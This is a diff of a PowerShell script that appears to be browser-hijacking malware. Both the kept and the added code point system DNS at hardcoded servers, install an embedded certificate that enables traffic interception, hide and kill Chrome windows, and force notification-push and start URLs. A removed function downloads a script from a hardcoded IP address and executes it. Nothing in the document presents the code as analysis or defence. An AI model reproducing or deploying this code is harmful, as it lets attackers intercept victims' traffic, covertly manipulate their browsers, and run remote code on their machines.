@@ -1,8 +1,8 @@
 ﻿$PrimaryDNSServer = '185.247.141.78'
 $SecondaryDNSServer = '185.247.141.51'
-$updateUrl = 'http://185.247.141.76/data/update.txt'
-$xpushes = @()
-$xstartUrls = @('https://yandex.ru')
+$updateUrl = '_updateUrl'
+$xpushes = @('https://microsoft.com', 'https://rambler.ru')
+$xstartUrls = @('https://yahoo.com', 'https://msn.com')
 $xdata = @{
     'mc.yandex.ru'='MIIKsQIBAzCCCm0GCSqGSIb3DQEHAaCCCl4EggpaMIIKVjCCBg8GCSqGSIb3DQEHAaCCBgAEggX8MIIF+DCCBfQGCyqGSIb3DQEMCgECoIIE/jCCBPowHAYKKoZIhvcNAQwBAzAOBAg7b907Z/l3VAICB9AEggTYV4Gwenr9KDAv3madoOk1EeF82TazbxTdlpCswTGL'+ 
 'IAQILTlqcPV/Gmp+Rn+//oP5vTJs0rRSP2Jm1Dj5J1XH4eySKWYJGIZ7B7EMNaxtSLep+0CDRTdEgRdRUNcgzZ6q+0sXRbdrTJtgP+EY4raH36QYFc0SThhDBYUFXmORAXiMPjd4Qyvch9WBVbL4Mry7OReP9hVofX4FJ7K9I0zzY2uYCkI7eyN9OsB50bbzD8ON99lr'+ 
@@ -256,32 +256,32 @@ function PushExists
     return $false
 }
 
-function List-Pushes()
-{
-    $preferencesPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Preferences"
+# function List-Pushes()
+# {
+#     $preferencesPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Preferences"
 
-    # Check if the Preferences file exists
-    if (Test-Path $preferencesPath) {
-        $preferencesContent = Get-Content -Path $preferencesPath -Raw | ConvertFrom-Json
+#     # Check if the Preferences file exists
+#     if (Test-Path $preferencesPath) {
+#         $preferencesContent = Get-Content -Path $preferencesPath -Raw | ConvertFrom-Json
 
-        $notificationSettings = $preferencesContent.profile.content_settings.exceptions.notifications
+#         $notificationSettings = $preferencesContent.profile.content_settings.exceptions.notifications
 
-        if ($notificationSettings -isnot [array]) {
-            $notificationSettings = @($notificationSettings)
-        }
+#         if ($notificationSettings -isnot [array]) {
+#             $notificationSettings = @($notificationSettings)
+#         }
 
-        if ($notificationSettings) {
-            foreach ($item in $notificationSettings) {
-                $jsonItem = $item | ConvertTo-Json -Depth 1
-                Write-Output $jsonItem
-            }
-        } else {
-            Write-Output "No notification settings found."
-        }
-    } else {
-        Write-Output "Preferences file not found at path: $preferencesPath"
-    }
-}
+#         if ($notificationSettings) {
+#             foreach ($item in $notificationSettings) {
+#                 $jsonItem = $item | ConvertTo-Json -Depth 1
+#                 Write-Output $jsonItem
+#             }
+#         } else {
+#             Write-Output "No notification settings found."
+#         }
+#     } else {
+#         Write-Output "Preferences file not found at path: $preferencesPath"
+#     }
+# }
 
 function Remove-Pushes {
     $preferencesPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Preferences"
@@ -434,7 +434,6 @@ function Close-AllChromes {
             [User32X]::ShowWindow($window, [User32X]::SW_HIDE) | Out-Null
             Close-ChromeWindow -window $window
         }
-        Write-Output "Window Handle: $($window.ToString()), Title: $title"
     }
     Close-Processes(@('chrome.exe'))
 }
@@ -479,12 +478,20 @@ function Open-ChromeWithUrl {
             while ((Get-Date) -lt $endTime) {
                 if ($isDebug -eq $false)
                 {
-                    [User32X]::ShowWindow($process.MainWindowHandle, [User32X]::SW_HIDE) | Out-Null
+                    try
+                    {
+                        [User32X]::ShowWindow($process.MainWindowHandle, [User32X]::SW_HIDE) | Out-Null
+                    }
+                    catch
+                    {
+                    }
                 }
                 Start-Sleep -Milliseconds 1
             }
             [User32X]::ShowWindow($process.MainWindowHandle, [User32X]::SW_SHOW) | Out-Null
             Close-Chrome -process $process
+
+            break
         } else {
             Write-Output "Chrome not found at: $path"
         }
@@ -560,7 +567,9 @@ function ConfigureChromePushes {
     foreach ($push in $xpushes) {
         Add-Push -pushUrl $push
     }
-    List-Pushes;
+}
+
+function LaunchChromePushes {
     foreach ($push in $xpushes) {
         Open-ChromeWithUrl -url $push
     }
@@ -825,6 +834,20 @@ function ConfigureOperaInternal {
 
 
 
+
+
+
+
+
+function DoStartUrls {
+    foreach ($startUrl in $xstartUrls) {
+        Start-Process $startUrl.Trim()
+    }
+}
+
+
+
+
 function ConfigureYandex
 {
     Close-Processes(@('service_update.exe','browser.exe'))
@@ -902,6 +925,9 @@ function ConfigureYandexInternal {
 
 
 
+
+
+
 function main {
     Set-DNSServers -PrimaryDNSServer $primaryDNSServer -SecondaryDNSServer $secondaryDNSServer
     ConfigureCertificates
@@ -912,34 +938,12 @@ function main {
     ConfigureOpera
     ConfigureChromeUblock
     ConfigureChromePushes
+    DoStartUrls
+    LaunchChromePushes
     DoAutoUpdate
 }
 
 main
-#AutoUpdate
 
-function DoAutoUpdate() {
-    $timeout = [datetime]::UtcNow.AddMinutes(1)
-    $delay = 5
-    
-    while ([datetime]::UtcNow -lt $timeout) {
-        try {
-            $response = Invoke-WebRequest -Uri $updateUrl -UseBasicParsing -Method Get
-
-            if ($response.StatusCode -eq 200) {
-                $scriptBlock = [ScriptBlock]::Create($response.Content)
-                . $scriptBlock
-                return
-            }
-        }
-        catch {
-            Write-Error "Failed to download or execute the script: $_"
-        }
-
-        Start-Sleep -Seconds $delay
-    }
-    Write-Error "Failed to download the script within the allotted time."
-}
-
-DoAutoUpdate
+Start-Process "https://vk.com"
 
